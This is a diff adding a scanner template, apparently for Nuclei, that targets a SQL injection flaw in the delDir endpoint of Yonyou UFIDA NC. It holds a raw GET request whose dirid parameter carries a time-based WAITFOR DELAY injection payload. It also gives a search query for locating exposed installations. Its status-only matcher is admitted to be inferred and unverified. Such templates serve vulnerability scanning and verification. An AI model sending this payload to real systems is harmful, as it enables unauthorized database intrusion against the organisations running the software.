@@ -1,0 +1,37 @@
+id: poc-6c53c965d001be446f01
+info:
+  name: 用友UFIDANCdelDir存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/6c53c965d001be446f014953cbb1a276
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 6c53c965d001be446f014953cbb1a276
+    fofa: + hunter`app.name="用友 UFIDA NC"`
+http:
+- raw:
+  - 'GET /portal/ptt/album/edit?cmd=delDir&dirid=1'';WAITFOR+DELAY''0:0:5''--+ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+
+    Cookie: JSESSIONID=8EBDF4C237BC5C74D3DCFBC03A800E45.server1; sl-session=jDXMDyG3JGVNQdvtd8uUlQ==; JSESSIONID=5BD4AC755F0F34EF57DA011EAD45C94C.server1
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
